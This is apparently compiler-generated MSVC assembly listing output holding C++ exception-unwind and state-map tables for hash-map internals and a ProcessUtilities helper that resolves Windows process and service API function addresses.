$unwind$??$find@X@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEAA?AV?$_List_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@1@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@@Z DD 020601H
	DD	030025206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$insert@U?$pair@PEBDPEAUHINSTANCE__@@@std@@$0A@@?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@QEAA?AU?$pair@V?$_List_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@_N@1@$$QEAU?$pair@PEBDPEAUHINSTANCE__@@@1@@Z DD 020601H
	DD	030023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Erase@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@AEAA_KAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@@Z DD 040a01H
	DD	08340aH
	DD	07006520aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$??$GetFunctionAddress@P6AHPEAX@Z@ProcessUtilities@@YAP6AHPEAX@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z DB 04H
	DB	'R'
	DB	02H
	DB	0ceH
	DB	00H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$??$GetFunctionAddress@P6AHPEAX@Z@ProcessUtilities@@YAP6AHPEAX@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z DB 02H
	DB	0cH
	DD	imagerel ??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ
	DB	090H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$??$GetFunctionAddress@P6AHPEAX@Z@ProcessUtilities@@YAP6AHPEAX@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z DB 028H
	DD	imagerel $stateUnwindMap$??$GetFunctionAddress@P6AHPEAX@Z@ProcessUtilities@@YAP6AHPEAX@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z
	DD	imagerel $ip2state$??$GetFunctionAddress@P6AHPEAX@Z@ProcessUtilities@@YAP6AHPEAX@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$GetFunctionAddress@P6AHPEAX@Z@ProcessUtilities@@YAP6AHPEAX@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z DD 041919H
	DD	010340aH
	DD	07006b20aH
	DD	imagerel __GSHandlerCheck_EH4
	DD	imagerel $cppxdata$??$GetFunctionAddress@P6AHPEAX@Z@ProcessUtilities@@YAP6AHPEAX@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z
	DD	052H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$??$GetFunctionAddress@P6APEAXKK@Z@ProcessUtilities@@YAP6APEAXKK@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z DB 04H
	DB	'R'
	DB	02H
	DB	0ceH
	DB	00H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$??$GetFunctionAddress@P6APEAXKK@Z@ProcessUtilities@@YAP6APEAXKK@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z DB 02H
	DB	0cH
	DD	imagerel ??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ
	DB	090H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$??$GetFunctionAddress@P6APEAXKK@Z@ProcessUtilities@@YAP6APEAXKK@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z DB 028H
	DD	imagerel $stateUnwindMap$??$GetFunctionAddress@P6APEAXKK@Z@ProcessUtilities@@YAP6APEAXKK@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z
	DD	imagerel $ip2state$??$GetFunctionAddress@P6APEAXKK@Z@ProcessUtilities@@YAP6APEAXKK@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$GetFunctionAddress@P6APEAXKK@Z@ProcessUtilities@@YAP6APEAXKK@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z DD 041919H
	DD	010340aH
	DD	07006b20aH
	DD	imagerel __GSHandlerCheck_EH4
	DD	imagerel $cppxdata$??$GetFunctionAddress@P6APEAXKK@Z@ProcessUtilities@@YAP6APEAXKK@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z
	DD	052H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$??$GetFunctionAddress@P6AHPEAXPEAUtagPROCESSENTRY32W@@@Z@ProcessUtilities@@YAP6AHPEAXPEAUtagPROCESSENTRY32W@@@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z DB 04H
	DB	'R'
	DB	02H
	DB	0ceH
	DB	00H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$??$GetFunctionAddress@P6AHPEAXPEAUtagPROCESSENTRY32W@@@Z@ProcessUtilities@@YAP6AHPEAXPEAUtagPROCESSENTRY32W@@@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z DB 02H
	DB	0cH
	DD	imagerel ??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ
	DB	090H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$??$GetFunctionAddress@P6AHPEAXPEAUtagPROCESSENTRY32W@@@Z@ProcessUtilities@@YAP6AHPEAXPEAUtagPROCESSENTRY32W@@@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z DB 028H
	DD	imagerel $stateUnwindMap$??$GetFunctionAddress@P6AHPEAXPEAUtagPROCESSENTRY32W@@@Z@ProcessUtilities@@YAP6AHPEAXPEAUtagPROCESSENTRY32W@@@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z
	DD	imagerel $ip2state$??$GetFunctionAddress@P6AHPEAXPEAUtagPROCESSENTRY32W@@@Z@ProcessUtilities@@YAP6AHPEAXPEAUtagPROCESSENTRY32W@@@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$GetFunctionAddress@P6AHPEAXPEAUtagPROCESSENTRY32W@@@Z@ProcessUtilities@@YAP6AHPEAXPEAUtagPROCESSENTRY32W@@@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z DD 041919H
	DD	010340aH
	DD	07006b20aH
	DD	imagerel __GSHandlerCheck_EH4
	DD	imagerel $cppxdata$??$GetFunctionAddress@P6AHPEAXPEAUtagPROCESSENTRY32W@@@Z@ProcessUtilities@@YAP6AHPEAXPEAUtagPROCESSENTRY32W@@@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z
	DD	052H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$??$GetFunctionAddress@P6AHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z@ProcessUtilities@@YAP6AHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z DB 04H
	DB	'R'
	DB	02H
	DB	0ceH
	DB	00H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$??$GetFunctionAddress@P6AHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z@ProcessUtilities@@YAP6AHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z DB 02H
	DB	0cH
	DD	imagerel ??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ
	DB	090H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$??$GetFunctionAddress@P6AHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z@ProcessUtilities@@YAP6AHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z DB 028H
	DD	imagerel $stateUnwindMap$??$GetFunctionAddress@P6AHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z@ProcessUtilities@@YAP6AHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z
	DD	imagerel $ip2state$??$GetFunctionAddress@P6AHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z@ProcessUtilities@@YAP6AHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$GetFunctionAddress@P6AHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z@ProcessUtilities@@YAP6AHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z DD 041919H
	DD	010340aH
	DD	07006b20aH
	DD	imagerel __GSHandlerCheck_EH4
	DD	imagerel $cppxdata$??$GetFunctionAddress@P6AHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z@ProcessUtilities@@YAP6AHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z
	DD	052H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$??$GetFunctionAddress@P6APEAUSC_HANDLE__@@PEAU1@PEBDK@Z@ProcessUtilities@@YAP6APEAUSC_HANDLE__@@PEAU1@PEBDK@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z DB 04H
	DB	'R'
	DB	02H
	DB	0ceH
	DB	00H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$??$GetFunctionAddress@P6APEAUSC_HANDLE__@@PEAU1@PEBDK@Z@ProcessUtilities@@YAP6APEAUSC_HANDLE__@@PEAU1@PEBDK@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z DB 02H
	DB	0cH
	DD	imagerel ??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ
	DB	090H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$??$GetFunctionAddress@P6APEAUSC_HANDLE__@@PEAU1@PEBDK@Z@ProcessUtilities@@YAP6APEAUSC_HANDLE__@@PEAU1@PEBDK@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z DB 028H
	DD	imagerel $stateUnwindMap$??$GetFunctionAddress@P6APEAUSC_HANDLE__@@PEAU1@PEBDK@Z@ProcessUtilities@@YAP6APEAUSC_HANDLE__@@PEAU1@PEBDK@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z
	DD	imagerel $ip2state$??$GetFunctionAddress@P6APEAUSC_HANDLE__@@PEAU1@PEBDK@Z@ProcessUtilities@@YAP6APEAUSC_HANDLE__@@PEAU1@PEBDK@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$GetFunctionAddress@P6APEAUSC_HANDLE__@@PEAU1@PEBDK@Z@ProcessUtilities@@YAP6APEAUSC_HANDLE__@@PEAU1@PEBDK@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z DD 041919H
	DD	010340aH
	DD	07006b20aH
	DD	imagerel __GSHandlerCheck_EH4
	DD	imagerel $cppxdata$??$GetFunctionAddress@P6APEAUSC_HANDLE__@@PEAU1@PEBDK@Z@ProcessUtilities@@YAP6APEAUSC_HANDLE__@@PEAU1@PEBDK@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z
	DD	052H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$??$GetFunctionAddress@P6APEAUSC_HANDLE__@@PEB_W0K@Z@ProcessUtilities@@YAP6APEAUSC_HANDLE__@@PEB_W0K@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z DB 04H
	DB	'R'
	DB	02H
	DB	0ceH
	DB	00H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$??$GetFunctionAddress@P6APEAUSC_HANDLE__@@PEB_W0K@Z@ProcessUtilities@@YAP6APEAUSC_HANDLE__@@PEB_W0K@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z DB 02H
	DB	0cH
	DD	imagerel ??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ
	DB	090H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$??$GetFunctionAddress@P6APEAUSC_HANDLE__@@PEB_W0K@Z@ProcessUtilities@@YAP6APEAUSC_HANDLE__@@PEB_W0K@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z DB 028H
	DD	imagerel $stateUnwindMap$??$GetFunctionAddress@P6APEAUSC_HANDLE__@@PEB_W0K@Z@ProcessUtilities@@YAP6APEAUSC_HANDLE__@@PEB_W0K@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z
	DD	imagerel $ip2state$??$GetFunctionAddress@P6APEAUSC_HANDLE__@@PEB_W0K@Z@ProcessUtilities@@YAP6APEAUSC_HANDLE__@@PEB_W0K@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$GetFunctionAddress@P6APEAUSC_HANDLE__@@PEB_W0K@Z@ProcessUtilities@@YAP6APEAUSC_HANDLE__@@PEB_W0K@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z DD 041919H
	DD	010340aH
	DD	07006b20aH
	DD	imagerel __GSHandlerCheck_EH4
	DD	imagerel $cppxdata$??$GetFunctionAddress@P6APEAUSC_HANDLE__@@PEB_W0K@Z@ProcessUtilities@@YAP6APEAUSC_HANDLE__@@PEB_W0K@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z
	DD	052H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$??$GetFunctionAddress@P6AHPEAUSC_HANDLE__@@W4_SC_STATUS_TYPE@@PEAEKPEAK@Z@ProcessUtilities@@YAP6AHPEAUSC_HANDLE__@@W4_SC_STATUS_TYPE@@PEAEKPEAK@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z DB 04H
	DB	'R'
	DB	02H
	DB	0ceH
	DB	00H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$??$GetFunctionAddress@P6AHPEAUSC_HANDLE__@@W4_SC_STATUS_TYPE@@PEAEKPEAK@Z@ProcessUtilities@@YAP6AHPEAUSC_HANDLE__@@W4_SC_STATUS_TYPE@@PEAEKPEAK@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z DB 02H
	DB	0cH
	DD	imagerel ??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ
	DB	090H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$??$GetFunctionAddress@P6AHPEAUSC_HANDLE__@@W4_SC_STATUS_TYPE@@PEAEKPEAK@Z@ProcessUtilities@@YAP6AHPEAUSC_HANDLE__@@W4_SC_STATUS_TYPE@@PEAEKPEAK@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z DB 028H
	DD	imagerel $stateUnwindMap$??$GetFunctionAddress@P6AHPEAUSC_HANDLE__@@W4_SC_STATUS_TYPE@@PEAEKPEAK@Z@ProcessUtilities@@YAP6AHPEAUSC_HANDLE__@@W4_SC_STATUS_TYPE@@PEAEKPEAK@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z
	DD	imagerel $ip2state$??$GetFunctionAddress@P6AHPEAUSC_HANDLE__@@W4_SC_STATUS_TYPE@@PEAEKPEAK@Z@ProcessUtilities@@YAP6AHPEAUSC_HANDLE__@@W4_SC_STATUS_TYPE@@PEAEKPEAK@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$GetFunctionAddress@P6AHPEAUSC_HANDLE__@@W4_SC_STATUS_TYPE@@PEAEKPEAK@Z@ProcessUtilities@@YAP6AHPEAUSC_HANDLE__@@W4_SC_STATUS_TYPE@@PEAEKPEAK@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z DD 041919H
	DD	010340aH
	DD	07006b20aH
	DD	imagerel __GSHandlerCheck_EH4
	DD	imagerel $cppxdata$??$GetFunctionAddress@P6AHPEAUSC_HANDLE__@@W4_SC_STATUS_TYPE@@PEAEKPEAK@Z@ProcessUtilities@@YAP6AHPEAUSC_HANDLE__@@W4_SC_STATUS_TYPE@@PEAEKPEAK@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z
	DD	052H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$??$GetFunctionAddress@P6AHPEAUSC_HANDLE__@@KPEB_W@Z@ProcessUtilities@@YAP6AHPEAUSC_HANDLE__@@KPEB_W@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z DB 04H
	DB	'R'
	DB	02H
	DB	0ceH
	DB	00H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$??$GetFunctionAddress@P6AHPEAUSC_HANDLE__@@KPEB_W@Z@ProcessUtilities@@YAP6AHPEAUSC_HANDLE__@@KPEB_W@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z DB 02H
	DB	0cH
	DD	imagerel ??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ
	DB	090H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$??$GetFunctionAddress@P6AHPEAUSC_HANDLE__@@KPEB_W@Z@ProcessUtilities@@YAP6AHPEAUSC_HANDLE__@@KPEB_W@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z DB 028H
	DD	imagerel $stateUnwindMap$??$GetFunctionAddress@P6AHPEAUSC_HANDLE__@@KPEB_W@Z@ProcessUtilities@@YAP6AHPEAUSC_HANDLE__@@KPEB_W@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z
	DD	imagerel $ip2state$??$GetFunctionAddress@P6AHPEAUSC_HANDLE__@@KPEB_W@Z@ProcessUtilities@@YAP6AHPEAUSC_HANDLE__@@KPEB_W@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$GetFunctionAddress@P6AHPEAUSC_HANDLE__@@KPEB_W@Z@ProcessUtilities@@YAP6AHPEAUSC_HANDLE__@@KPEB_W@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z DD 041919H
	DD	010340aH
	DD	07006b20aH
	DD	imagerel __GSHandlerCheck_EH4
	DD	imagerel $cppxdata$??$GetFunctionAddress@P6AHPEAUSC_HANDLE__@@KPEB_W@Z@ProcessUtilities@@YAP6AHPEAUSC_HANDLE__@@KPEB_W@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z
	DD	052H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Find_last@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@IEBA?AU?$_Hash_find_last_result@PEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@1@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@_K@Z DD 0a6501H
	DD	09f465H
	DD	08545cH
	DD	0a340dH
	DD	0e009320dH
	DD	060067007H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Get_size_of_n@$07@std@@YA_K_K@Z DD 010401H
	DD	04204H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Traits_find@U?$char_traits@D@std@@@std@@YA_KQEBD_K101@Z DD 0a1801H
	DD	0a6418H
	DD	095418H
	DD	083418H
	DD	0f0143218H
	DD	07010e012H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$2$??$_Free_non_head@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@SAXAEAV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@1@PEAU01@@Z DD 020021H
	DD	067400H
	DD	imagerel $LN124
	DD	imagerel $LN124+27
	DD	imagerel $unwind$??$_Free_non_head@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@SAXAEAV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@1@PEAU01@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$1$??$_Free_non_head@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@SAXAEAV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@1@PEAU01@@Z DD 021H
	DD	imagerel $LN124
	DD	imagerel $LN124+27
	DD	imagerel $unwind$??$_Free_non_head@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@SAXAEAV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@1@PEAU01@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$0$??$_Free_non_head@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@SAXAEAV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@1@PEAU01@@Z DD 020521H
	DD	067405H
	DD	imagerel $LN124
	DD	imagerel $LN124+27
